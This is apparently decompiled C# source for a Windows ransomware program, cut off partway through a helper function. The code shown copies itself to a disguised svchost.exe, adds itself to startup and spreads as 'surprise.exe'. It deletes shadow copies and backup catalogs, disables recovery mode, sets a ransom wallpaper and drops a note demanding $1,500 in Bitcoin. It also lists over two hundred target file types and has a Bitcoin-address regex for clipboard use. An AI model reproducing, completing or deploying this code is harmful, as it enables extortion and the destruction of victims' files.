using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
	}

	private static string userName = Environment.UserName;

	private static string userDir = "C:\\Users\\";

	public static string appMutexRun = "7z459ajrk722yn8c5j4fg";

	public static bool encryptionAesRsa = false;

	public static string encryptedFileExtension = "";

	private static bool checkSpread = true;

	private static string spreadName = "surprise.exe";

	private static bool checkCopyRoaming = true;

	private static string processName = "svchost.exe";

	public static string appMutexRun2 = "2X28tfRmWaPyPQgvoHV";

	private static bool checkStartupFolder = true;

	private static bool checkSleep = false;

	private static int sleepTextbox = 10;

	private static string base64Image = "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";

	public static string appMutexStartup = "1qw0ll8p9m8uezhqhyd";

	private static string droppedMessageTextbox = "read_it.txt";

	private static bool checkAdminPrivilage = true;

	private static bool checkdeleteShadowCopies = true;

	private static bool checkdisableRecoveryMode = true;

	private static bool checkdeleteBackupCatalog = true;

	public static string appMutexStartup2 = "17CqMQFeuB3NTzJ";

	public static string appMutex2 = appMutexStartup2 + appMutexRun2;

	public static string staticSplit = "bc";

	public static string appMutex = staticSplit + appMutexStartup + appMutexRun;

	public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static string[] messages = new string[12]
	{
		"---------------------------->All of your files have been encrypted<----------------------------", "All of your files have been encrypted", "Your computer was infected with a ransomware virus. Your files have been encrypted and you won't ", "be able to decrypt them without our help.What can I do to get my files back?You can buy our special ", "decryption software, this software will allow you to recover all of your data and remove the", "ransomware from your computer.The price for the software is $1,500. Payment can be made in Bitcoin only.", "", "                                                             Contact", "", "                                                     -Email/ piliacraf24@gmail.com",
		"                                                     -Telegram/ @Try_2_hackk", ""
	};

	private static string[] validExtensions = new string[229]
	{
		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
		".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
		".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
		".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
		".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
		".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
		".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
		".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
		".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
		".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
		".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
		".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
		".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
		".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
		".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
		".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
		".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
		".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
		".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
		".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
		".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
		".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
		".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d"
	};

	private static Random random = new Random();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		if (checkSleep)
		{
			sleepOutOfTempFolder();
		}
		if (checkAdminPrivilage)
		{
			copyResistForAdmin(processName);
		}
		else if (checkCopyRoaming)
		{
			copyRoaming(processName);
		}
		if (checkStartupFolder)
		{
			addLinkToStartup();
		}
		lookForDirectories();
		if (checkAdminPrivilage)
		{
			if (checkdeleteShadowCopies)
			{
				deleteShadowCopies();
			}
			if (checkdisableRecoveryMode)
			{
				disableRecoveryMode();
			}
			if (checkdeleteBackupCatalog)
			{
				deleteBackupCatalog();
			}
		}
		if (checkSpread)
		{
			spreadIt(spreadName);
		}
		addAndOpenNote();
		SetWallpaper(base64Image);
		new Thread((ThreadStart)delegate
		{
			Run();
		}).Start();
	}

	public static void Run()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static void sleepOutOfTempFolder()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(sleepTextbox * 1000);
		}
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static byte[] random_bytes(int length)
	{
		Random random = new Random();
		length++;
		byte[] array = new byte[length];
		random.NextBytes(array);
		return array;
	}

	public static string RandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < length; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
